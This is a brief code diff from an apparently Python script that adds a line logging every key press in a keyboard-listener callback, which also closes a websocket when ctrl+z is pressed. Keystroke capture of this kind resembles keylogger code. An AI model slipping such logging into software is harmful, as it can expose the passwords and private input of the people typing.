@@ -21,6 +21,7 @@ key_pressed = ''
 # on_press function => logging the pressed key
 # is stopped when ctrl+z is pressed
 def on_press(key):
+    logging.info(str(key))
     if hasattr(key, 'char') and key.char == '\x1a':
         ws.close()
         return False
